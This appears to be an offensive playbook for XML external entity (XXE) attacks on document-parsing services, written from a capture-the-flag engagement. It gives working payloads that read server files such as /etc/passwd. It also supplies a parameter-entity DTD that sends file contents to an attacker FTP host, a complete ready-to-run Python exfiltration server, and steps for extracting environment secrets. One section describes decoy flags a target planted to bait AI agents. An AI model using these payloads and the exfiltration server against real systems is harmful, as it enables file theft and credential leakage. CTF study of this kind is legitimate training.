# Document-Parsing-Engine XXE — condensed recipe

Applies to XML-manifest document processors (Tika-style, "docintel-core", Office/PDF parsers)
that expose an extract/parse endpoint (e.g. `POST /api/v1/extract`, `Content-Type: application/xml`).

## 1. Confirm the endpoint accepts XML
```bash
curl -s -X POST http://TARGET/api/v1/extract \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><manifest><title>hi</title></manifest>'
```

## 2. Entity-expansion read (works for plain-text, no `<`/`&` files)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<manifest><title>&xxe;</title></manifest>
```
Reflected into `title`/`author`/`keywords`/`created`/`body`/`text`/`content`. BREAKS on files
containing `<` or `&` (source code, HTML) -> `parse error: file:///path:N:M: error in processing
external entity reference`. Newlines are fine; only `<`, `&`, and null bytes break it.

## 3. Literal-path document fetch (engine-dependent — CONFIRM, don't assume)
Try each FIELD with a LITERAL path (no entity):
```xml
<?xml version="1.0"?><manifest><FIELD>file:///app/app.py</FIELD></manifest>
```
FIELD candidates: document, file, path, src, source, url, doc, input, location, content,
body, resource, archive, filename, href, link, target, uri.

**Reality check (docintel-core engine, observed):** the literal-path fetch did NOT work here.
Only `<body>` echoed the supplied string as literal text (`text_preview` = the path, `wc:1`);
all other fields returned `fields_found:[]`, and a control `file:///etc/passwd` literal was
also empty. So: (a) test EVERY field; (b) prove a control fetch retrieves a server-side file
before claiming the bypass. If nothing fetches, the engine only does entity-expansion XXE and
you are limited to XML-safe files. XInclude (`<xi:include href=... parse="text"/>`) is also
disabled on this engine — don't bother.

## 4. OOB reachability gate (Python urllib = no newline/null in URL)
- Test static egress FIRST (no `%file;`): external DTD `SYSTEM 'http://YOURIP:PORT/ping'`.
  No connection to YOUR listener => egress firewalled => OOB impossible, pivot to in-band.
- HTTP OOB of a multi-line file dies silently (urllib `ValueError` on `\n`/`\0` in URL).
- FTP OOB `ftp://YOURIP:2121/%file;` sidesteps newlines, BUT the content lands in the `RETR`
  **command path**. A server that only logs `RETR /<content>` captures only **line 1** of a
  multi-line file. To capture the FULL file you must service the **data connection**: answer
  PASV with a data-port you listen on and write whatever the client sends to disk. Use the
  server in section 6 for multi-line targets (`app.py`); a path-logging-only server is fine
  for a single-line flag (`ctf7{...}` on its own line).

## 5. Flaky-box brute discipline (find the XML-safe flag file)
If the host flaps, a naive brute mislabels live paths as absent. Instead:
- Classify by error type: `No such file`=absent · `Permission denied`=exists, app-user can't
  read · `Is a directory`=exists · `parse error`=exists but XML-unsafe (unreadable in-band).
- Retry on transient `Read timed out` / `No route to host`; re-run in a stable window.
- The flag is almost always in an XML-safe, app-readable file. Watch PERMDENIED hits
  (e.g. `/root/flag.txt` under a non-root app user) — the real flag sits in an app-readable
  sibling path. `/app` often contains ONLY `app.py` (XML-unsafe) plus the flag elsewhere.

## 6. Ready-to-run FTP exfil server (captures full multi-line content)
Save as `scripts/ftp_exfil_server.py` and run `python3 scripts/ftp_exfil_server.py`.
Listens on ctrl :2121, data :2122; writes RETR command paths to `ftp_exfil.log` and the
full exfiltrated bytes (from the data connection) to `ftp_exfil_data.log`.
```python
#!/usr/bin/env python3
import socket, threading, time
CTRL, DATA = 2121, 2122
LOG = open("ftp_exfil.log", "a"); DAT = open("ftp_exfil_data.log", "a")
def log(s): LOG.write(s+"\n"); LOG.flush()
def data_srv():
    ds = socket.socket(); ds.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ds.bind(("0.0.0.0", DATA)); ds.listen(5); log(f"DATA on {DATA}")
    while True:
        try:
            c, _ = ds.accept(); buf = b""
            c.settimeout(10)
            try:
                while True:
                    ch = c.recv(4096)
                    if not ch: break
                    buf += ch
            except: pass
            c.close()
            DAT.write(f"\n--- EXFIL {time.strftime('%H:%M:%S')} ({len(buf)}B) ---\n")
            DAT.write(buf.decode(errors="replace")); DAT.write("\n--- END ---\n"); DAT.flush()
            log(f"EXFIL {len(buf)}B")
        except Exception as e: log(f"data err {e}")
def handle(conn):
    conn.sendall(b"220 ok\r\n")
    def send(s): conn.sendall(s.encode()+b"\r\n")
    while True:
        try: d = conn.recv(4096)
        except: return
        if not d: return
        line = d.decode(errors="replace").strip()
        if not line: continue
        log(f"CMD {line}")
        cmd = line.split()[0].upper()
        if cmd == "USER": send("331 ok")
        elif cmd == "PASS": send("230 ok")
        elif cmd == "SYST": send("215 UNIX")
        elif cmd == "PWD": send("257 /")
        elif cmd == "TYPE": send("200 ok")
        elif cmd == "PASV": send("227 Entering Passive Mode (ATTACKER_IP_HERE,8,74)")
        elif cmd == "PORT": send("200 ok")
        elif cmd == "RETR":
            log(f"RETR>> {line[5:].strip()}")
            send("150 Opening"); send("226 Done")
        elif cmd in ("LIST","NLST"): send("150"); send("226")
        elif cmd == "QUIT": send("221 bye"); return
        else: send("200 ok")
threading.Thread(target=data_srv, daemon=True).start()
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", CTRL)); s.listen(5); log(f"CTRL on {CTRL}")
while True:
    c, a = s.accept(); log(f"CONN {a}"); threading.Thread(target=handle, args=(c,), daemon=True).start()
```
Replace `ATTACKER_IP_HERE` with your public IP (the PASV octets encode it; last two octets
encode the data port: `hi*256+lo`). Trigger with the standard parameter-entity DTD:
`<!ENTITY % file SYSTEM "file:///PATH"><!ENTITY % eval "<!ENTITY % exfil SYSTEM 'ftp://ATTACKER:2121/%file;'>">%eval;%exfil;`.

## 7. Decoys / AI-agent honeypot flags — DO NOT SUBMIT
Targets that explicitly address "AI agents" / "automated tools" (in robots.txt, `/llms.txt`,
or a custom header) frequently plant **decoy flags in flag-format** to bait automated submissions.
On the DocIntel engagement the box seeded decoys in FIVE+ places:
- `robots.txt` → `ctf7{r0b0ts_h0neyp0t_n0t_real}`
- `/llms.txt` → `ctf7{h0neyp0t_flag_f0r_ai_agents_...}`
- a custom `X-AI-Advisory` response header (troll text)
- frontend HTML `<title>`/body → `ctf7{h0neyp0t_html_n0tice_n0t_the_real_fl4g}`
- `/api/v1/telemetry` → **6000 entries** of `ctf7{decoy_NNNNN_not_the_real_flag_keep_out}`

Also note: a `Disallow:` list in robots.txt is itself often a **distraction** — the disclosed
`/admin/`, `/backup/`, `/.git/`, `/db-backup.sql`, `/config.old`, `/api/internal/` were ALL 404.
Decoy `X-Tika-Version` / `Server: Apache Tika` headers are also fake (engine was Python urllib).
**Rule:** treat every flag-format string as hostile until corroborated by an actual file read/exfil.
Grep large decoy corpora (e.g. telemetry) for any flag NOT matching the decoy regex — on DocIntel
all 6000 matched, so there was no hidden real flag among them.

## 8. OOB reachability gate — exact recipe (and the "reaches webhook.site ≠ reaches MY IP" trap)
Before any OOB exfil, prove egress to *your own* listener. A successful DTD fetch from
paste.rs/webhook.site only proves the parser reaches the public internet — NOT that it can reach
your attacker IP (egress to your box may be firewalled separately).
1. Start listeners on YOUR box (public IP `ATTACKER_IP`):
```bash
python3 -m http.server 8088 --bind 0.0.0.0 >/tmp/http_exfil.log 2>&1 &
python3 scripts/ftp_exfil_server.py &   # ctrl :2121, data :2122
```
2. **Self-test the listeners locally** (rules out a silent listener bug):
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8088/localtest
# expect a line in /tmp/http_exfil.log
```
3. From the victim parser, send a **STATIC** (no `%file;`) ping to YOUR IP:
```xml
<!DOCTYPE r [ <!ENTITY % xx SYSTEM "http://ATTACKER_IP:8088/ping-clean-http"> %xx; ]>
<manifest><title>t</title></manifest>
<!-- also try ftp://ATTACKER_IP:2121/ping-clean-ftp -->
```
4. Check `/tmp/http_exfil.log` + `ftp_exfil.log` for a hit. No hit ⇒ egress to your IP is
   firewalled ⇒ OOB impossible, pivot to in-band/literal-path. (On DocIntel the engine fetched
   DTDs from paste.rs fine, but static pings to the attacker IP produced ZERO connections.)

## 9. Null-separated files are unreadable in-band (`/proc/self/environ`, `/proc/self/cmdline`)
`&xxe;` of these yields `parse error: ...:1:80: error in processing external entity reference`
(parser dies on the first NUL at ~col 80). They hold flags/env secrets but are XML-unsafe.
Only an OOB channel that tolerates NULs (FTP, not HTTP) could exfil — and only if egress to
your host is open. During a brute, classify their `parse error` as "exists but unreadable in-band".

